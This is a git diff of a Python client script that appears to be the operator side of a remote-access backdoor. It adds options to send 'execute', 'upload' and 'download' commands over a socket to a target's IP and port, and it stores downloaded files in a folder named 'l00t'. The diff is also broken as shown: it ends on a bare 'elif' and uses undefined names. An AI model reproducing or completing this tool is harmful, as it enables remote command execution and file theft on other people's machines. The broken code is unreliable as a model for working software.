@@ -2,7 +2,7 @@
 import os
 import socket
 import base64
-import argsparse
+import argparse
 import sys
 import time
 
@@ -79,7 +79,35 @@ def main():
     args = parser.parse_args()
     IP = args.IP
     Port = int(args.PORT)
+    exec_cmd = args.execute
+
+    #commands#
+
+    #execute
+    if args.execute:
+       send_cmd = "execute::"+ exec_cmd
+       recv_command = connection(IP, Port, send_cmd)
+       print(recv_command.decode('utf-8'))
+    #upload
+    elif args.upload:
+        file_upload = args.upload
+        dest_file_up = args.destination_file
+        enc_b64_up=b64_file(file_upload)
+        send_cmd = ("upload::" 
+            + enc_b64_up.decode('utf-8') + "::" 
+            + dest_file_up
+            )
+        recv_back = connection(IP, Port, send_cmd)
+        print(recv_back)
+    elif args.download_file:
+        file_download = args.download_file
+        send_cmd = "download::" + file_download
+        if not os.path.exists(l00t_folder):
+            os.mkdir("./l00t")
+            download_file()
+        elif 
 
 
-if _name_ == "__main__":
+
+if __name__ == "__main__":
     main()
